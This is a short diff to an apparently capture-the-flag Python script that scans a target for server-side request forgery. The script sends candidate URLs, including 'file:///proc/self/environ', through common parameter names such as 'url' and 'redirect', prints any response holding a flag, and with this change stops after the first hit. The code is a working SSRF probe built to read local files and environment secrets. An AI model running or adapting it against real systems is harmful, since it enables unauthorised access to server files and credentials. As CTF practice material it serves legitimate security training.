@@ -226,12 +226,17 @@ candidates = [
     'file:///proc/self/environ',
 ]
 params = ('url', 'target', 'site', 'image', 'file', 'path', 'redirect', 'to', 'link')
+_hit = False
 for cand in candidates:
+    if _hit:
+        break
     for p in params:
         try:
             r = httpx.get(base, params={p: cand}, timeout=10, follow_redirects=True)
             if 'flag{' in r.text:
                 print('[ssrf-hit] param=%s url=%s -> %s' % (p, cand, r.text[:400]))
+                _hit = True
+                break
         except Exception as e:
             pass
 '''
